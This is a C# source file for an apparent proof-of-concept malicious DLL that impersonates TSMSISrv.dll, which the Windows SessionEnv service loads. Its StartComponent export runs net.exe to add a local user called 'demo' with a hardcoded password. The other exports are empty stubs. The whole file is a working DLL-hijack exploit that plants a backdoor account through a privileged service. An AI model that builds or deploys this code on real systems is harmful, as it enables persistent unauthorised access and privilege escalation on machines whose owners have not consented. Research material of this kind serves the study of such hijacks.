using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using RGiesecke.DllExport;

namespace TSMSISrv_poc
{
    class Program
    {


        static void Main(string[] args)
        {
        }

        #region DLL Exports for TSMSISrv.dll on the SessionEnv service
        [DllExport("StartComponent", CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
        public static void StartComponent()
        {
            string netText = "user demo SpecTer0ps1nc! /add";
            Process.Start("net.exe", netText);
        }
        [DllExport("StopComponent", CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
        public static void StopComponent()
        {
            
        }
        [DllExport("OnSessionChange", CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
        public static void OnSessionChange()
        {
            
        }
        [DllExport("Refresh", CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
        public static void Refresh()
        {
            
        }
        #endregion
    }
}
